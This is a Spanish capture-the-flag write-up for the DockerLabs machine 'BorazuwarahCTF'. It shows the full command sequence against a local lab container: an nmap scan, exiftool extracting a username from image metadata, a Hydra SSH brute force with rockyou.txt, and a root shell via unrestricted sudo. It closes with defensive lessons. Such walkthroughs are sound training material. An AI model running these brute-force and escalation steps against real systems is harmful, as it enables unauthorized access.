# BorazuwarahCTF — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🔵 Muy Fácil  
**SO:** Linux  
**Autor de la máquina:** BorazuwarahCTF  
**Fecha de creación:** 28/05/2024  
**Técnicas:** Nmap · Descarga de imagen · Exiftool (metadatos EXIF) · Hydra · SSH · Privesc (sudo su)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — imagen con metadatos](#2-enumeración-web--imagen-con-metadatos)
3. [Extracción de usuario con Exiftool](#3-extracción-de-usuario-con-exiftool)
4. [Fuerza bruta SSH con Hydra](#4-fuerza-bruta-ssh-con-hydra)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh borazuwarahctf.tar
```

> IP asignada: `172.17.0.2`.

```bash
ping -c 2 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.085 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.033 ms
```

Escaneo de puertos:

```bash
nmap -Pn 172.17.0.2
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Escaneo con versiones:

```bash
nmap -p22,80 -sCV -Pn 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Site doesn't have a title (text/html).
```

---

## 2. Enumeración web — imagen con metadatos

Visitamos `http://172.17.0.2` y vemos una única imagen en la página — un huevo Kinder Sorpresa. No hay texto relevante en el HTML. Descargamos la imagen para analizarla:

```bash
wget http://172.17.0.2/imagen.jpeg
```

---

## 3. Extracción de usuario con Exiftool

Exiftool lee los metadatos EXIF incrustados en la imagen — cámara, fecha, GPS, y a veces campos personalizados:

```bash
exiftool imagen.jpeg
```

```
ExifTool Version Number         : 13.25
File Name                       : imagen.jpeg
File Size                       : 19 kB
File Type                       : JPEG
Image Width                     : 455
Image Height                    : 455
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password: ----------
```

> 💡 **Los metadatos EXIF** son datos adicionales almacenados dentro de la imagen. Las cámaras los usan para guardar coordenadas GPS, modelo de cámara, etc. En CTFs, los creadores los usan para ocultar información como nombres de usuario. Siempre analiza las imágenes con `exiftool` antes de descartarlas.

El campo `Description` revela el usuario: **borazuwarah**. El campo `Title` está en blanco — la contraseña hay que encontrarla por fuerza bruta.

---

## 4. Fuerza bruta SSH con Hydra

Con el usuario ya conocido, lanzamos Hydra contra SSH:

```bash
hydra -l borazuwarah -P ~/Descargas/rockyou.txt ssh://172.17.0.2
```

```
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
```

Contraseña encontrada: **123456**. Conectamos:

```bash
sudo ssh borazuwarah@172.17.0.2
```

```
borazuwarah@172.17.0.2's password: 123456
borazuwarah@1af6d6bb32ed:~$
```

✅ Acceso conseguido como **borazuwarah**.

---

## 5. Escalada de privilegios

Comprobamos permisos sudo:

```bash
borazuwarah@1af6d6bb32ed:~$ sudo -l
```

```
User borazuwarah may run the following commands on 1af6d6bb32ed:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

El usuario puede ejecutar **cualquier comando como root** y específicamente `bash` sin contraseña. Escalada directa:

```bash
borazuwarah@1af6d6bb32ed:~$ sudo su
[sudo] password for borazuwarah: 123456
root@1af6d6bb32ed:/home/borazuwarah# whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Usuario en metadatos EXIF de imagen** | `imagen.jpeg` → campo Description | Enumeración de usuario sin autenticación |
| **Contraseña trivial (123456)** | Usuario borazuwarah en SSH | Fuerza bruta en segundos |
| **sudo sin restricciones (ALL)** | Configuración sudoers | Escalada inmediata a root |

**Para defenderse:**
- Limpiar metadatos EXIF antes de publicar imágenes: `exiftool -all= imagen.jpeg`
- "123456" es la contraseña más usada del mundo — nunca usarla en producción.
- La directiva `(ALL : ALL) ALL` en sudoers equivale a dar acceso root completo. Usar el principio de mínimo privilegio.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
